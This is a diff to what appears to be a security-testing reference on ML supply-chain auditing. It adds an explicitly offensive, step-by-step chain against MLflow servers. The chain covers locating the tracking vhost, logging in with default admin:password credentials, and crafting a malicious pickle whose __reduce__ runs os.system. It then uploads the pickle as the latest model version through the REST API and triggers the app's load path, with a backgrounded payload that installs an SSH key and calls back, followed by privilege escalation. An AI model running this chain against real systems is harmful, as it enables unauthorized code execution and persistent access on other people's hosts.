@@ -43,6 +43,24 @@ Audit each dependency the same way you would audit a typical SBOM, plus model-sp
    cyclonedx-py --requirements requirements.txt > sbom.json
    ```
 
+## MLflow Model Registry → pyfunc pickle RCE (offensive chain)
+
+When the target is an ML app with train/predict features backed by **MLflow**:
+
+1. **Find the tracking server.** It is frequently on a *separate vhost* (e.g. `models.`/`mlflow.<domain>`). Host-header fuzz for a non-redirect response; the signature is `WWW-Authenticate: Basic realm="mlflow"`. (`/health` is unauth.)
+2. **Auth.** Try MLflow's default basic-auth `admin:password`. Success → full REST API (`/api/2.0/mlflow/...`, `/api/2.0/mlflow-artifacts/...`).
+3. **RCE primitive.** Loading any registered model = unpickling its artifact. `loader_module: mlflow.pyfunc.model` → `python_model.pkl` (cloudpickle); sklearn flavor → `model.pkl`. `mlflow.pyfunc.load_model` → `cloudpickle.load` executes a pickle `__reduce__`.
+4. **Chain** (curl + basic auth; `--resolve` the vhost):
+   - Clone a real model's artifact dir: `GET /api/2.0/mlflow/artifacts/list?run_id=<r>&path=model` then fetch `MLmodel` + meta via `/api/2.0/mlflow-artifacts/artifacts/<exp>/<run>/artifacts/model/<file>`.
+   - Evil pkl: `class E:\n def __reduce__(self): return (os.system,("<cmd>",))` → `pickle.dump(E(),f)` (backgrounded payload: install SSH key + callback, so the unpickle returns fast).
+   - `POST /api/2.0/mlflow/runs/create` (`experiment_id` 0) → new `run_id`.
+   - `PUT /api/2.0/mlflow-artifacts/artifacts/0/<run>/artifacts/model/{MLmodel,python_model.pkl,...}` (evil pkl).
+   - `POST /api/2.0/mlflow/model-versions/create` `name=<your existing model>` `source=mlflow-artifacts:/0/<run>/artifacts/model` → becomes the **latest** version.
+   - Trigger the app's predict/load path → RCE in the **app host** context (often a service user). Post-load error like `'int' object has no attribute 'load_context'` confirms exec (`os.system` returned an int).
+5. **Also with API access:** artifact path traversal / `source=file://...` arbitrary file read (CVE-2023-1177 / 2023-6018 / 2023-6831).
+
+Relates to **CVE-2024-37052..37060** (MLflow model-load deserialization). Load == unpickle regardless of patch level — the "fix" is a warning, not a safe loader. Then escalate from the service user (see [system privesc](../../../../system/reference/INDEX.md)).
+
 ## Verifying success
 
 - Concrete CVE / mis-configuration tied to a named component, with version and fix.
